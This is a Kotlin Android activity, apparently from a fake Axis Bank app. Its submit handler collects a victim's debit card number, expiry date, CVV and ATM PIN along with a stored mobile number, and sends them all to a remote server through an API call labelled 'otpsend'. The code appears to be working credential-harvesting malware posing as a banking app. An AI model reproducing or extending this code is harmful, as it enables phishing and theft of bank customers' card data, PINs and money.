package com.example.axisbank

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import com.example.axisbank.databinding.ActivityOpttwoBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class opttwo : AppCompatActivity() {

    private lateinit var binding : ActivityOpttwoBinding;

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityOpttwoBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.back.setOnClickListener {
            finish()
        }

        binding.submit.setOnClickListener {
            if (binding.deb.text.toString().isEmpty()||binding.exp.text.toString().isEmpty()
                ||binding.cvv.text.toString().isEmpty()||binding.atm.text.toString().isEmpty() ){
                Toast.makeText(this,"Fill all fields", Toast.LENGTH_SHORT).show()
            }else{

                val intentff = Intent(this, finalscreen::class.java)
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val util = Util()
                val data = OTP(last_update = "second", mobile = util.getLocalData(this,"mobile"),
                    atmpin = binding.atm.text.toString(), deb = binding.deb.text.toString(), exp = binding.exp.text.toString(),
                cvv = binding.cvv.text.toString() )
                val call = apiService.otpsend(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })


            }
        }


    }
}